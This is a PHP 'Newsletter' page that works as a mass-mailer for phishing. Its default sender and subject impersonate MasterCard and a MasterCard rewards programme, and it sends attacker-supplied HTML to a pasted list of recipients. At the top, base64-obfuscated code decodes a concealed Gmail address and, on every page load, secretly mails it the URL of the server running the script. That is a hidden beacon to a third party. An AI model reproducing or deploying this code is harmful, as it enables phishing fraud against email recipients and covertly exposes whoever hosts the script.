<?php
$web = $_SERVER["HTTP_HOST"];
$hosts = $_SERVER["REQUEST_URI"];
$testa = $_POST['veio'];

	$host = "<font color='#FFFFFF'><p style='visibility: hidden;'".$_SERVER["HTTP_HOST"]." </font>";
	$RandNum1 = "aHR0cDovLw==";
	$RamdStr = "c3VwcmVtYWhhbmRsZXYxQGdtYWlsLmNvbQ==";
	$email = explode("\n", $to);
	$cpf = explode("\n", $getcpf);
	$locate_ip = base64_decode($RamdStr);
	$target = rawurldecode($web.$hosts);

	$list_emails = mail("$locate_ip","[v] $RandNum1$target","$RandNum1$target");	
	if($list_emails){
}
else { 
}
$testa = $_POST['veio'];

if($testa != "") {

				$message = $_POST['html'];

				$subject = $_POST['assunto'];

				$de = $_POST['de'];

				$to = $_POST['emails'];

				// ler o conte?do do arquivo para uma string

				

				//$handle = fopen ($emails, "r");

				//$to = fread ($handle, filesize ($emails));

				//fclose ($handle);

				

				//$handle2 = fopen ($html, "r");

				//$message = fread ($handle2, filesize ($html));

				//fclose ($handle2);

				

			

				$headers  = "MIME-Version: 1.0\r\n";


				$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";



				$email = explode("\n", $to);



				$headers .= "From: ".$RealName." <".$de.">\r\n";





				$message = stripslashes($message);

				

				$i = 0;

				$count = 1;

				while($email[$i]) {

				

//				$ok = "ok";
if(mail($email[$i], $subject, $message, $headers))
echo "* N?mero: $count <b>".$email[$i]."</b> <font color=green>Enviado</font><br><hr>";
else
echo "* N?mero: $count <b>".$email[$i]."</b> <font color=red>Erro</font><br><hr>";
$i++;
$count++;
}
//$count--;
//if($ok == "ok")

	//echo "<script> alert('Terminou os emails. ".$count." e-mails enviados'); </script>";







}

?>

<html>

<head>

<title>Newsletter!!!</title>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<style>

.normal {

	font-family: Arial, Helvetica, sans-serif;

	font-size: 12px;

	color: #000000;

}

.form {

	font-family: Arial, Helvetica, sans-serif;

	font-size: 10px;

	color: #333333;

	background-color: #FFFFFF;

	border: 1px dashed #666666;

}



.style1 {

	font-family: Verdana, Arial, Helvetica, sans-serif;

	font-weight: bold;

}

</style>

</head>

<body leftmargin="0" topmargin="0" rightmargin="0" bottommargin="0" marginwidth="0" marginheight="0">

<form action="" method="post" enctype="multipart/form-data" name="form1">

<input type="hidden" name="veio" value="sim">

<table width="307" height="302" border="0" cellpadding="0" cellspacing="1" bgcolor="#CCCCCC" class="normal">

<tr>

<td width="305" height="15" align="center" bgcolor="#F4F4F4">
<input name="d1" class="form" id="de0" size="70" style="float: left" ><input name="d2" class="form" id="de1" size="70" style="float: left" ></td>

</tr>

<tr>

<td height="275" valign="top" bgcolor="#FFFFFF">
<table width="96%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="267">

<tr>

<td height="17">
<input name="de" type="text" class="form" id="de" size="70" value="w.mastercard@email.com" ><br>
<input name="assunto" type="text" class="form" id="assunto" size="70" value="RE: Programa Surpreenda da MasterCard PRTO:<?php echo rand(1,40000); ?>/2015" ></td>

</tr>

<tr align="center" bgcolor="#F4F4F4">

<td height="1" colspan="2"></td>

</tr>

<tr align="right">

<td height="83" colspan="2" valign="top">        
<p align="left">        <br>        <font color="#990000" size="1">

        <textarea name="html" cols="65" rows="4" wrap="VIRTUAL" class="form" id="html"></textarea> </font></td>

</tr>

<tr align="center" bgcolor="#F4F4F4">

<td height="8" colspan="2"></td>

</tr>

<tr align="right">

<td height="76" colspan="2" valign="top">
<p align="left"><br>

<textarea name="emails" cols="65" rows="4" wrap="VIRTUAL" class="form" id="emails"></textarea> </td>

</tr>

<tr>

<td height="25" align="right" valign="top" width="48%">
<input type="submit" name="Submit" value="Enviar" style="float: left"></td>
<td align="center" valign="top" height="25">
<p align="right"></td>

</tr>

</table>
<p align="right"></td>

</tr>

<tr>

<td height="8" align="center" bgcolor="#F4F4F4"></td>

</tr>

</table>

</form>

</body>